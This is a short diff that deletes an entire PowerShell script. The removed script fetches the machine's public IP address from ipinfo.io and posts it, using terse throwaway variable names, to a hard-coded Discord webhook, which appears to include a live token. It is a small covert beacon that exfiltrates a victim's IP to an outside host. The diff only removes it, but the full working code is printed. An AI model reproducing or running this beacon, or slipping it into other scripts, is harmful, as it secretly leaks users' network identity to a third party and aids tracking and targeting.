@@ -1,7 +1,0 @@
-$dgf = "https://discord.com/api/webhooks/1316298613969784862/_OMy4oqca0lsmkHKpRjDC_3YwN8-sozzs_damUpQqIjDD7SRna4YF12_707FeHdReO-L"
-$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
-$wwwww = $ipInfo.ip
-$me = @{
-    content = "+ $wwwww"
-}
-Invoke-RestMethod -Uri $dgf -Method Post -Body ($me | ConvertTo-Json) -ContentType "application/json"
